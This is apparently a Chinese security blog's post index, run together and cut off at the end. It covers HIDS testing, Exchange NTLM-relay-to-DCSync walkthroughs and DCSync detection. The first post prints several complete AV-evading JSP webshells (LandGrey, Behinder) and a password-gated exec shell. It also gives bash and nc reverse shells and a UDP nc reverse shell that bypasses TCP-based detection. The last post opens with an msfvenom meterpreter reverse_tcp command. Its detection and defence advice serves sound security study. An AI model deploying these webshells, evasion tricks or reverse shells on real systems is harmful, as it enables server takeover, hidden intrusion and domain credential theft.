Audit\n\n远程命令执行通过Linux下的Audit审计工具的日志进行检测\n\n![image001](HIDS.assets/image001.png)\n\n实线代表的是数据流，虚线代表的是组件之间的控制关系。audit是内核中的一个模块，通过守护进程audit获取内核中产生的数据，由其他的 auditd、audispd、auditctl、autrace、ausearch 和 aureport 等应用程序进行存储分析等操作。不同的应用程序的作用：\n\n```\nauditctl : 即时控制审计守护进程的行为的工具，如添加规则等。\nauditd ：audit 守护进程负责把内核产生的信息写入到硬盘上，这些信息由应用程序和系统活动触发产生。用户空间审计系统通过 auditd 后台进程接收内核审计系统传送来的审计信息，将信息写入到 /var/log/audit/audit.log。\naureport : 查看和生成审计报告的工具。\nausearch : 查找审计事件的工具\nauditspd : 转发事件通知给其他应用程序，而不是写入到审计日志文件中。\nautrace : 一个用于跟踪进程的命令。类似于 strace，跟踪某一个进程，并将跟踪的结果写入日志文件之中。\n```\n\nHIDS就是通过分析audit产生的日志来判断是否存在远程命令执行。更多详情可以参考https://www.ibm.com/developerworks/cn/linux/l-lo-use-space-audit-tool/index.html\n\n#### Audit日志格式\n\n一条原始的Audit日志：\n\n```\ntype=SYSCALL msg=audit(1584596604.534:130765): arch=c000003e syscall=59 success=yes exit=0 a0=1b198e0 a1=1b13fc0 a2=1b13b60 a3=7ffd3bcb4820 items=2 ppid=9316 pid=9319 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=\"grep\" exe=\"/usr/bin/grep\" key=(null)\n```\n\n其中每个字段的含义为：\n\n```\ntype=SYSCALL\n　　每条记录都是以type=\"keyword\"开头，SYSCALL表示这条记录是向内核的系统调用触发产生的。更详细的type值和解释可以参考：https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/sec-Audit_Record_Types\n\nmsg=audit(1584596604.534:130765)\n　　在audit(time_stamp:ID)格式中，记录时间戳，从1970年1月1日00:00:00到现在的时间，ID为记录中唯一的ID标识，同一个事件产生的ID是相同的，如上访问audit_test目录会触发产生三条日志，但是事件ID是相同的。\n\narch=c000003e\n　　表示系统的CPU架构，这个十六进制表示”x86_64“，使用命令ausearch -i --arch c000003e可以打印出有这部分内容的audit.log中日志的解释。需要注意的是，使用ausearch来查询时，需要保证audit log中有这样的日志记录。\n\nsyscall=59\n　　向内核的系统调用的类型，类型值为59，在/usr/include/asm/unistd_64.h中有定义，可以通过ausyscall查询代表的类型\n```\n\n![image-20200319151851705](HIDS.assets/image-20200319151851705.png)\n\n```\nsuccess=yes\n　　表示系统调用成功与否\n　　\nexit=3\n　　系统调用结束时的返回码，可以使用如下命令来查看返回值为0的日志解释，不同的系统调用，返回值不同。\n#ausearch --interpret --exit 0\n\na0=1b198e0 a1=1b13fc0 a2=1b13b60 a3=7ffd3bcb4820\n　　为系统调用时的前四个arguments，这些arguments依赖于使用的系统调用，可以使用ausearch来查看解释（部分参数可以打印出数值具体的解释）。\n\nitems=1\n　　表示跟在系统调用后，补充记录的个数。\n\nppid=9316\n　　父进程ID，如bash的ID。\n\npid=9319\n　　进程Id，即为进程的ID。\n```\n\n这里命令执行测试的是通过Web服务执行命令时的检测情况，会触发type=EXECVE类型的Audit日志（下文会提到）。\n\n### 反弹shell\n\n常规的反弹shell比如nc、bash进行反弹shell都会产生tcp连接，从而触发规则，例如：\n\n```shell\nnc -lvp 1234\nbash -i >& /dev/tcp/127.0.0.1/1234 0>&1\n```\n\n![image-20200326164235284](HIDS.assets/image-20200326164235284.png)\n\n## 测试\n\n### Webshell\n\nWebshell文件使用了几个Git上提供的免杀的小马：https://github.com/LandGrey/webshell-detect-bypass/tree/master/webshell/jsp\n\n#### 小马1：\n\n```jsp\n<%@ page import=\"java.util.Scanner\" pageEncoding=\"UTF-8\" %>\n<HTML>\n<title>Just For Fun</title>\n<BODY>\n<H3>Build By LandGrey</H3>\n<FORM METHOD=POST ACTION='#'>\n    <INPUT name='q' type=text>\n    <INPUT type=submit value='Fly'>\n</FORM>\n<%!\n    public static String getPicture(String str) throws Exception{\n        String fileSeparator = String.valueOf(java.io.File.separatorChar);\n        if(fileSeparator.equals(\"\\\\\")){\n            str = new String(new byte[] {99, 109, 100, 46, 101, 120, 101, 32, 47, 67, 32}) + str;\n        }else{\n            str =  new String(new byte[] {47, 98, 105, 110, 47, 98, 97, 115, 104, 32, 45, 99, 32}) + str;\n        }\n        Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));\n        Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null, new Object[]{}),  new Object[] { str });\n        Scanner sc = new Scanner(e.getInputStream()).useDelimiter(\"\\\\A\");\n        String result = \"\";\n        result = sc.hasNext() ? sc.next() : result;\n        sc.close();\n        return result;\n    }\n%>\n<%\n    String name =\"Input Nothing\";\n    String query = request.getParameter(\"q\");\n    if(query != null) {\n        name = getPicture(query);\n    }\n%>\n<pre>\n<%= name %>\n</pre>\n</BODY>\n</HTML>\n```\n\n#### 小马2：\n\n```jsp\n<%@ page pageEncoding=\"utf-8\"%>\n<%@ page import=\"java.util.Scanner\" %>\n<HTML>\n<title>Just For Fun</title>\n<BODY>\n<H3>Build By LandGrey</H3>\n<FORM METHOD=\"POST\" NAME=\"form\" ACTION=\"#\">\n    <INPUT TYPE=\"text\" NAME=\"q\">\n    <INPUT TYPE=\"submit\" VALUE=\"Fly\">\n</FORM>\n<%\n    String op=\"Got Nothing\";\n    String query = request.getParameter(\"q\");\n    String fileSeparator = String.valueOf(java.io.File.separatorChar);\n    Boolean isWin;\n    if(fileSeparator.equals(\"\\\\\")){\n        isWin = true;\n    }else{\n        isWin = false;\n    }\n    if (query != null) {\n        ProcessBuilder pb;\n        if(isWin) {\n            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);\n        }else{\n            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);\n        }\n        Process process = pb.start();\n        Scanner sc = new Scanner(process.getInputStream()).useDelimiter(\"\\\\A\");\n        op = sc.hasNext() ? sc.next() : op;\n        sc.close();\n    }\n%>\n<PRE>\n    <%= op %>>\n</PRE>\n</BODY>\n</HTML>\n```\n\n#### 小马3：\n\n```jsp\n<%@ page pageEncoding=\"UTF-8\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page import=\"java.util.Scanner\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"sun.misc.BASE64Encoder\" %>\n<%@ page import=\"sun.misc.BASE64Decoder\" %>\n<HTML>\n<title>Just For Fun</title>\n<BODY>\n<H3>Build By LandGrey</H3>\n<FORM METHOD=POST ACTION='#'>\n    <INPUT name='q' type=text>\n    <INPUT type=submit value='Fly'>\n</FORM>\n<%!\n    public static String getPicture(String str) throws Exception {\n        List<String> list = new ArrayList<String>();\n        BASE64Decoder decoder = new BASE64Decoder();\n        BASE64Encoder encoder = new BASE64Encoder();\n        String fileSeparator = String.valueOf(java.io.File.separatorChar);\n        if(fileSeparator.equals(\"\\\\\")){\n            list.add(new String(decoder.decodeBuffer(\"Y21k\")));// cmd\n            list.add(new String(decoder.decodeBuffer(\"L2M=\")));// /c\n        }else{\n            list.add(new String(decoder.decodeBuffer(\"L2Jpbi9iYXNo\")));// /bin/bash\n            list.add(new String(decoder.decodeBuffer(\"LWM=\")));//\t-c\n        }\n        list.add(new String(decoder.decodeBuffer(str)));\n        Class PB = Class.forName(new String(decoder.decodeBuffer(\"amF2YS5sYW5nLlByb2Nlc3NCdWlsZGVy\"))); //java.lang.ProcessBuilder\n        Process s = (Process) PB.getMethod(new String(decoder.decodeBuffer(\"c3RhcnQ=\"))).invoke(PB.getDeclaredConstructors()[0].newInstance(list)); //start\n        Scanner sc = new Scanner(s.getInputStream()).useDelimiter(\"\\\\A\");\n        String result = \"\";\n        result = sc.hasNext() ? sc.next() : result;\n        sc.close();\n        return encoder.encode(result.getBytes(\"UTF-8\"));\n    }\n%>\n<%\n    String name =\"Input Nothing\";\n    String query = request.getParameter(\"q\");\n    if(query != null) {\n        name = getPicture(query);\n    }\n%>\n<pre>\n<%= name %>\n</pre>\n</BODY>\n</HTML>\n```\n\n#### 冰蝎jsp\n\n```jsp\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%>\n<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%>\n<%if(request.getParameter(\"pass\")!=null)\n\t{\n\tString k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);\n\tsession.putValue(\"u\",k);\n\tout.print(k);\n\treturn;\n\t}\n\tCipher c=Cipher.getInstance(\"AES\");\n\tc.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));\n\tnew U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);\n%>\n```\n\n#### 冰蝎jspx\n\n```jspx\n<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\">\n<jsp:directive.page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"/>\n<jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>if(request.getParameter(\"pass\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>\n```\n\n对于样本的尝试也很简单，在上传的时候发现有的告警有的没有告警，最后经过尝试发现ProcessBuilder()+jsp会触发告警，没什么好说的，这里主要是记录一下这几个免杀马。\n\n### RCE\n\n在是RCE的时候使用冰蝎连接，发现HIDS未产生告警，但是使用小马2、小马3直接执行命令能够产生告警，一开始猜测是因为冰蝎使用的是ClassLoader加载类进行执行代码，所以就跟了一下ClassLoader机制。\n\n#### Classloader\n\nClassloader是Java的类加载机制，能够加载将Java文件编译成的class类。\n\n首先创建一个弹calc.exe的processbuilddemo.java文件：\n\n```java\npackage test;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class processbuilddemo {\n    public processbuilddemo() throws IOException {\n        System.out.println(\"Hello, World!\");\n        byte exec1[] = new byte[]{99, 109, 100};\n        System.out.println(exec1);\n        List<String> command = new ArrayList<String>();\n        command.add( \"cmd.exe\" );\n        command.add( \"/c\" );\n        command.add( \"calc.exe\" );\n        ProcessBuilder pb = new ProcessBuilder( ( command ) );\n        Process process = pb.start();\n        InputStream inputStream = process.getInputStream();\n        InputStream errorStream = process.getErrorStream();\n    }\n}\n```\n\n执行命令进行编译\n\n```\njavac -d . processbuilddemo.java\n```\n\n此时会生成一个class类型二进制文件\n\n![image-20200326175840195](HIDS.assets/image-20200326175840195.png)\n\n然后可以使用Classloader加载processbuilddemo类\n\n```java\npackage test;\nimport java.io.File;\nimport java.net.URI;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class PBDemo2 {\n    public static void main(String[] args) throws Exception{\n        File file = new File(\"d:/java\");\n        URI uri = file.toURI();\n        URL url = uri.toURL();\n\n        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n        System.out.println(classLoader.getParent());\n        Class clazz = classLoader.loadClass(\"test.processbuilddemo\"); //加载processbuilddemo类\n        clazz.newInstance();\t//实例化processbuilddemo类\n    }\n}\n```\n\n运行之后calc.exe被执行\n\n![image-20200326180319401](HIDS.assets/image-20200326180319401.png)\n\n更多的内容可参考https://www.bilibili.com/video/BV1vJ41177cw?p=10\n\n#### getRuntime()和buildprocess()\n\n虽然搞明白了classloader的使用，但是并没有起到什么作用，因为后来看到网上一个文章写到冰蝎使用的是Runtime.getRuntime().exec(）方法，然后使用Runtime.getRuntime().exec(）小马执行命令发现未触发告警。\n\n```jsp\n<%@ page language=\"java\" contentType=\"text/html; charset=GBK\"\n    pageEncoding=\"UTF-8\"%>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\n<html>\n    <head>\n        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n        <title>Ò»¾ä»°Ä¾Âí</title>\n    </head>\n    <body>\n        <%\n        if (\"admin\".equals(request.getParameter(\"pwd\"))) {\n            java.io.InputStream input = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();\n            int len = -1;\n            byte[] bytes = new byte[4092];\n            out.print(\"<pre>\");\n            while ((len = input.read(bytes)) != -1) {\n                out.println(new String(bytes, \"GBK\"));\n            }\n            out.print(\"</pre>\");\n        }\n    %>\n    </body>\n</html>\n```\n\n查看audit日志发现：\n\nruntime方式：\n\n```\ntype=EXECVE msg=audit(1584934227.310:403872): argc=1 a0=\"ifconfig\"\n//执行单个命令时（比如whoami，ifconfig），使用runtime只会产生一条日志\ntype=EXECVE msg=audit(1584934299.349:403960): argc=1 a0=\"ls\"\ntype=EXECVE msg=audit(1584934310.195:403963): argc=2 a0=\"cat\" a1=\"version.sh\"\n为什么cd ../能触发\ntype=EXECVE msg=audit(1584934362.586:404009): argc=3 a0=\"/bin/sh\" a1=\"/bin/cd\" a2=\"../\"\n```\n\nprocessbuild方式：\n\n```\ntype=EXECVE msg=audit(1584934434.580:404060): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"whoami\"\ntype=EXECVE msg=audit(1584934434.582:404061): argc=1 a0=\"whoami\"\n这种方式会产生两条日志\ntype=EXECVE msg=audit(1584934612.434:404205): argc=3 a0=\"/bin/bash\" a1=\"-c\" a2=\"ifconfig\"\ntype=EXECVE msg=audit(1584934612.437:404206): argc=1 a0=\"ifconfig\"\n```\n\n原来是因为使用processbuild的小马使用了/bin/bash的路径，如果去掉则能够饶过，但是部分命令会报错。先知上有个文章分析这两种方式的不同方式，写的很详细。https://xz.aliyun.com/t/6503\n\n### 反弹shell\n\n常规的反弹shell:\n\n```shell\nnc -lvp 1234\nbash -i >& /dev/tcp/127.0.0.1/1234 0>&1\n```\n\n![image-20200326164235284](HIDS.assets/image-20200326164235284.png)\n\nbash反弹shell的原理链接：https://xz.aliyun.com/t/2549\n\n测试后发现检测的是TCP连接，然后找到了一个使用nc进行udp连接的方式进行绕过：\n\n```shell\n被控主机：\ncp /bin/bash /bin/bshell //这里是为了lsof看起来方便，所以改名成了bshell\nmkfifo test\nnc -u 127.0.0.1 1234 < test | {  bshell; } > test\n\n控制端：\nnc -l -p 1234 -v -u\n```\n\n这里执行之后会产生一个/dev/pts/0的虚拟终端和一个UDP的连接\n\n![image-20200325151223244](HIDS.assets/image-20200325151223244.png)\n\n![image-20200325153100396](HIDS.assets/image-20200325153100396.png)\n\n#### dev/tty和dev/pts\n\n概念：\n\n```\ntty一词源于Teletypes，或者teletypewriters，原来指的是电传打字机，是通过串行线用打印机键盘通过阅读和发送信息的东西，后来这东西被键盘与显示器取代，所以现在叫终端比较合适。 \n\npts(pseudo-terminal slave)是pty的实现方法，与ptmx(pseudo-terminal master)配合使用实现pty。 \n终端是一种字符型设备，它有多种类型，通常使用tty来简称各种类型的终端设备。\n```\n\n/dev/tty是什么？ \ntty设备包括虚拟控制台，串口以及伪终端设备。/dev/tty代表当前tty设备，在当前的终端中输入 echo \"hello\" > /dev/tty ，都会直接显示在当前的终端中。 可以使用tty查看当前tty\n\n![image-20200325112201550](HIDS.assets/image-20200325112201550.png)\n\n可以看到tty执行之后输出的内容为/dev/pts/0，换一个终端（这里的终端全部都是ssh终端）执行的结果为：\n\n![image-20200325112242870](HIDS.assets/image-20200325112242870.png)\n\n也就是说每一个终端都有不同的文件来代替，同时，既然一切皆文件，我在/dev/pts/0的终端中输入\n\n```\necho \"hello\" > /dev/pts/3\n```\n\n是可以看到pts/3会接收到了hello数据\n\n![image-20200325112506075](HIDS.assets/image-20200325112506075.png)\n\n使用bash -i >& /dev/tcp/1.1.1.1/1234 0>&1反弹shell时不会产生PTS，只会产生类似于下面格式的TCP连接：\n\n```\nsshd  29282  root  3u   IPv4      7635990   0t0    TCP 1.1.1.1:55555->2.2.2.2:1111\n```\n\n![image-20200325133710822](HIDS.assets/image-20200325133710822.png)\n","categories":["RedTeam&域安全"]},{"title":"Exchange+NTLMRelay","url":"/2020/12-18-Exchange+NTLMRelay/","content":"\nMicrosoft Exchange Server是Microsoft开发的邮件服务器和日历服务器。它仅在Windows Server操作系统上运行。在全世界都拥有广泛的用户，2018年底Exchange被爆出存在SSRF漏洞，并且通过此漏洞可以获取域内的域控权限，然后在2019年NTLM协议被爆出漏洞能够绕过SMB签名的限制，Exchange再次被与NTLMRelay结合使用，本篇来记录一些其中曾经迷惑与关注的一些点。首先进行两个实验的复现。\n\n## Exchange SSRF+NTLMRelay\n\n### 环境\n\n```\n域控：\nwindows server 2012\nIP：192.168.254.149\n\nExchange服务器：\nwindows server 2012\nExchange 2013\nIP：192.168.254.150\n\n攻击机Ubuntu：\nIP：192.168.254.129\n```\n\n### 复现HTTP->LDAP\n\n首先直接用secretsdump.py直接尝试发现失败。\n\n![img](Exchange+NTLMRelay.assets/clip_image002.jpg)\n\n然后开启NTLMRelay脚本和Privexchange，设置ldap服务器的地址（也就是域控的地址）。\n\n![img](Exchange+NTLMRelay.assets/clip_image004.jpg)\n\n![img](Exchange+NTLMRelay.assets/clip_image006.jpg)\n\n然后再次使用secretdump成功获取域内所有HASH（NTDS内容）\n\n![img](Exchange+NTLMRelay.assets/clip_image008.jpg)\n\n## Exchange与CVE-2019-1040\n\n### 环境\n\n这里的环境与上一个环境是一样的\n\n```\n域控：\nwindows server 2012\nIP：192.168.254.149\n\nExchange服务器：\nwindows server 2012\nExchange 2013\nIP：192.168.254.150\n\nUbuntu：\nIP：192.168.254.129\n```\n\n### 复现SMB->LDAP\n\n首先运行ntlmrelayx.py\n\n![img](Exchange+NTLMRelay.assets/clip_image010.jpg)\n\n然后运行Printbug.py来触发SMB连接\n\n![img](Exchange+NTLMRelay.assets/clip_image011.png)\n\n打完了之后成功DCSync获取域内所有用户密码的NTLM HASH值\n\n![img](Exchange+NTLMRelay.assets/clip_image013.jpg)\n\n执行成功之后其实依然可以看到在LDAP的ACL中添加的xiaom@yunying.lab，权限为复制目录更改所有项。\n\n## 失败的NTLMRelay\n\n在这个实验之前在windows2008的环境下安装了Exchange2010，一直没有实验成功，这次换了环境成功之后分别抓包看了一下发现了两者的区别。首先看下报错，这里提示The client requested signing。This usually happens when relaying from smb to LDAP，也就是有签名。\n\n![img](Exchange+NTLMRelay.assets/clip_image015.jpg)\n\n### PCAP对比\n\n看了下在windows server 2012+Exchange2013环境下成功的PCAP包和失败的包对比在签名处是不同的。\n\n这个是中继失败的：\n\n![img](Exchange+NTLMRelay.assets/clip_image017.jpg)\n\n这个是中继成功的：\n\n![img](Exchange+NTLMRelay.assets/clip_image019.jpg)\n\n同时可以在NTLM的第三个流程NTLMSSP_AUTH中看到用于数字签名的session key的区别，成功中继的Session Key是空的，而中继失败的是存在Session Key的。\n\n![img](Exchange+NTLMRelay.assets/clip_image021.jpg)\n\n### SMB签名是如何被绕过的\n\n微软为了防止SMB协议被中继使用了SMB签名的机制，但是只有一个SMB签名没办法防止中继攻击修改NTLM协议中的标志位，从而取消使用SMB签名。\n\n![img](Exchange+NTLMRelay.assets/clip_image022.jpg)\n\n为了防止签名的标志位被修改，微软引入了MIC（Message Integrity Code）的概念，他的值根据三次NTLM的内容进行计算，具体方法可以参考：\n\nhttps://social.msdn.microsoft.com/Forums/en-US/cc304532-74ba-43e6-be3d-bb010d11e6ae/about-ntlm-mic-item-in-authenticatemessage?forum=os_windowsprotocols\n\n如果存在任何一个NTLM包被修改，则验证不通过，同时MIC的值受协议中的msvAvFlag标志位限制，值为2时说明存在MIC。\n\n![img](Exchange+NTLMRelay.assets/clip_image024.jpg)\n\n也就是说，SMB签名防止中间人攻击，MIC防止NTLM协议中的关于SMB的字段被修改，msvAvFlag防止MIC被删除，看似没有漏洞，但是实际情况是Microsoft服务器并没有对msvAvFlag的值做验证，并且允许无MIC的NTLM消息通过验证。这导致了攻击者可以直接删除MIC，并且通过修改FLAG中的标志位关闭SMB签名的验证。\n\n其中修改的位置有：\n\n```\n1、将NTLM_NEGOTIAT中的NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN标志位修改为0；\n2、从NTLM_AUTHENTICATE消息中删除MIC；\n3、从NTLM_AUTHENTICATE消息中删除版本字段（删除MIC字段而不删除版本字段将导致错误）；\n4、取消设置NTLM_AUTHENTICATE消息中的以下标志：NTLMSSP_NEGOTIATE_ALWAYS_SIGN，NTLMSSP_NEGOTIATE_SIGN，NEGOTIATE_KEY_EXCHANGE，NEGOTIATE_VERSION。\n```\n\n从而完美绕过SMB签名。\n\n### SMB签名为何能防止中继攻击\n\n在NTLM中有个字段是Session Key，USER Session Key分为：\n\n```\nThe LM User Session Key\nThe NTLM User Session Key\nThe LMv2 User Session Key\nThe NTLMv2 User Session Key\nThe NTLM2 Session Response User Session Key\n```\n\nNegotiate Sign标志的存在表明支持签名（保证消息完整性），Negotiate Seal标志表示支持密封（消息机密性），两者一起执行时表示密封消息并且生成签名（分别由SSPI MakeSignature和SSPI EncryptMessage方法完成）。\n\nSession Key的生成：\n\n其中在NTLMv2中的Session Key是由NTLMv2 HASH作为HMAC-MD5的盐加密challenge与blob的连接值，产生的16字节的输出值。客户端计算出这个值之后在flags中设置好标记位，然后把Session Key和NTLMv2 Response一起发送给服务端，服务端再校验Session Key的值。**所以Session Key不是签名，而是用来交换签名的加密密钥的****。**交换密钥之后得到了Master Key然后使用MasterKey生成关于**整个上层协议**（比如SMB或者LDAP）的签名。\n\n​         在找到得出这些结论的资料之前一直思考的是NTLM既然是一个嵌套的协议如果签名判断的是NTLM协议的内容，那在中继的整个过程中实际上NTLM的那一段是不发生变化的，实际上是对整个上层协议进行签名，而不是只签名NTLM这一部分协议内容。\n\n## 攻击前后的对比及分析\n\n### 对比\n\n使用两种方式攻击之后，都能够获取域内所有用户的HASH值（DCSync），那这个过程是怎么样的呢？实际上不论是第一种还是第二种最终攻击的对象都是LDAP服务，区别在于一个是从HTTP中继到LDAP，一个是从SMB中继到LDAP。而在LDAP被攻击之后，两个实验所执行的操作都是相同的。同时要说的一个点是在中继的过程中，无论是HTTP中继到LDAP还是SMB中继到LDAP，在对LDAP进行验证的时候使用的User name都是EXCHANGE2012$。\n\n![img](Exchange+NTLMRelay.assets/clip_image026.jpg)\n\n而EXCHANGE2012$作为主体属于Exchange Trusted Subsystem组，Exchange Trusted Subsystem组属于Exchange Windows Permissions组，而Exchange Windows Permissions组拥有WriteDACL的权限。\n\n![img](Exchange+NTLMRelay.assets/clip_image027.png)\n\n![img](Exchange+NTLMRelay.assets/clip_image029.jpg)\n\n在攻击之前和攻击之后的区别在于LDAP的ACL发生了一些变化，打开ADSI编辑器，通过“属性”中的权限，可以看到ACL列表，其中添加了xiaom@yunying.lab，权限为复制目录更改所有项，其实也就是一个writeDACL的过程。\n\n![img](Exchange+NTLMRelay.assets/clip_image031.jpg)\n\n### ACL与DACL\n\n说到WriteDACL那肯定要知道DACL是什么，还有就是为何修改了DACL之后就能够进行DCSync从而获取域内密码。\n\nWindows的ACL分为两类：\n\n```\n1、Discretionary Access Control List (DACL)  自由访问控制列表\n2、System Access Control List (SACL) 系统访问控制列表\n```\n\n每一种控制列表中都存在若干条ACE（Access Control Entries）\n\nAccess Token：\n\n当线程与[安全对象](https://docs.microsoft.com/zh-cn/windows/win32/secauthz/securable-objects)交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户，访问令牌包括以下信息：\n\n```\nThe security identifier (SID) for the user's account\nSIDs for the groups of which the user is a member\nA logon SID that identifies the current logon session\nA list of the privileges held by either the user or the user's groups\nAn owner SID\nThe SID for the primary group\nThe default DACL that the system uses when the user creates a securable object without specifying a security descriptor\nThe source of the access token\nWhether the token is a primary or impersonation token\nAn optional list of restricting SIDs\nCurrent impersonation levels\nOther statistics\n```\n\nDACL：\n\n系统将每一个ACE中的受托人与线程访问令牌中标识的受托人进行比较。访问令牌包含标识用户和用户所属组账户的SID。令牌还包含标识当前会话的logon SID ，具体流程参见下图：\n\n![img](Exchange+NTLMRelay.assets/clip_image032.png)\n\n线程与安全对象之间的交互：\n\n在Access check中，系统将线程访问令牌中的安全信息与安全对象安全描述符中的安全信息进行比较。\n\n系统检查对象的DACL，查找应用于用户的ACE，并从线程的访问令牌中分组SID，系统会检查每个SID，知道授予或拒绝访问，或者知道没有其他ACE要检查为止。\n\n![img](Exchange+NTLMRelay.assets/clip_image034.jpg)\n\n而这个漏洞正是通过高权限的账户，在DACL中添加了一条ACE，这里就是将普通账户xiaom赋予了“复制目录更改所有”权限，从而成功进行DCSync攻击。能够进行DCSync的三个权限：\n\n```\n1、复制目录更改Replicating Directory Changes (DS-Replication-Get-Changes)\n2、复制目录更改所有Replicating Directory Changes All (DS-Replication-Get-Changes-All)\n3、正在复制筛选集中的目录更改Replicating Directory Changes In Filtered Set (rare, only required in some environments)\n```\n\n### 利用链\n\n通过上述内容可以看到一个完整的利用链为：\n\n![img](Exchange+NTLMRelay.assets/clip_image036.png)\n\n其中的关键点在于触发SSRF或者是SpoolService的bug，然后就是Exchange Windows Permissions组的高权限和添加的“复制目录更改所有”权限。","categories":["RedTeam&域安全"]},{"title":"DCSync使用和利用检测","url":"/2020/12-18-DCSync使用和利用检测/","content":"\n2015年8月Mimkatz增加的一个主要功能是“DCSync”，它有效地“模仿”域控制器并从目标域控制器请求帐户密码数据。DCSync由Benjamin Delpy和Vincent Le Toux编写。\n\nDCSync之前的利用方法是在域控制器上运行Mimikatz或Invoke-Mimikatz以获取KRBTGT密码哈希来创建Golden Tickets。然而借助Mimikatz的DCSync和相应的权限，攻击者可以通过网络从域控制器提取密码哈希以及以前的密码哈希，而无需交互式登录或复制Active Directory数据库文件（ntds.dit）。（也就是说从本地转为远程）。\n\n![1575788668353](DCSync使用和利用检测.assets/1575788668353.png)\n\n同时要说明的是在最新的Exchange中通过NTLMRelay最后实现的功能也是DCSync\n\n## 原理\n```\n1、\t在指定的域名中发现域控\n2、\t通过GetNCChanges请求域控复制用户凭据。（使用Directory Replication Services DRS目录复制服务远程协议）\n```\n\n![1575788713873](DCSync使用和利用检测.assets/1575788713873.png)\n\nhttps://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47\n详细信息可以参考官方文档提供的关于目录复制服务的简单说明，这个协议的主要作用其实是为了多个域控的环境中不同域控之间同步信息时使用的，主要是为了域控之间信息的一致性。大多数复制相关任务都在目录复制服务（DRS）远程协议上指定。实现此类协议的Microsoft API称为DRSUAPI。\nhttps://wiki.samba.org/index.php/DRSUAPI\n\n![1575788744221](DCSync使用和利用检测.assets/1575788744221.png)\n\nDCSync使用的就是DRSUAPI中的DSGetNCChanges接口。\n文中描述可以理解为，当一个（攻击者）想到从另一个（域控）中获取更新时，就会发起DSGetNCChanges请求，响应包含客户端必须应用于其NC副本的一组更新（域用户HASH值）。\n\n## Delegating Rights to Pull Account data\n\n可以使用常规域用户进行DCSync（有些文章表达的观点是需要使用域管理员账户或者是域控上的Administrator账户，实际并不是），前提是要委派给这个域用户以下三个权限（三个权限中的其中一个）。\n\n```\n复制目录更改Replicating Directory Changes (DS-Replication-Get-Changes)\n复制目录更改所有Replicating Directory Changes All (DS-Replication-Get-Changes-All)（Exchange用的就是这个）\n正在复制筛选集中的目录更改Replicating Directory Changes In Filtered Set (rare, only required in some environments)\n```\n\n把ADSI中，域的DACL中添加一条普通域账号xiaom的“复制目录更改所有项”之后，这个xiaom账号就具有了可以在test域中进行DCSync的权限。\n\n![1575788859055](DCSync使用和利用检测.assets/1575788859055.png)\n\n可以看到默认情况下Administrators组和Domain Controller组的成员具有这些权限。\n\n## DCSync的检测与防御\n只要是非两个域控之间的DsGetNCChange请求都可以高度怀疑为DCSync/DCShadow攻击。\n\n![1575788874903](DCSync使用和利用检测.assets/1575788874903.png)\n\n可以在防御的时候将域控之间设置为白名单（两个域控之间为正常），域内主机和域控中间存在此类连接即判断为DCSync或者是DCShadow。\n\n在防御上的策略建议是在每次针对域内的ACL进行更改时都做记录，并且定时排查域内的DACL是否存在被修改的情况。可以使用工具：\nhttps://github.com/nccgroup/WindowsDACLEnumProject\nhttps://github.com/cyberark/ACLight","categories":["RedTeam&域安全"]},{"title":"C_ShellCode执行时的指针问题","url":"/2020/12-18-C_ShellCode执行时的指针问题/","content":"\n前段时间在测试McAfee免杀的时候，发现网上提供的一种方法https://mp.weixin.qq.com/s/HsIqUKl7j1WJ4yyYzXdPZg\n直接使用一句C代码执行shellcode，之前用过很多次了，看到这句语句决定看一下这个是怎么执行的。\n\n## 方法\n\n首先使用msfvenom生成shellcode\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.130 lport=4444 -f c\n```\n\n![image-20200708154231970](C_ShellCode执行时的指针问题.assets/image-20200708154231970.png)\n\n添加到VC++中：\n\n```c\n#include \"stdafx.h\"\n\nunsigned char 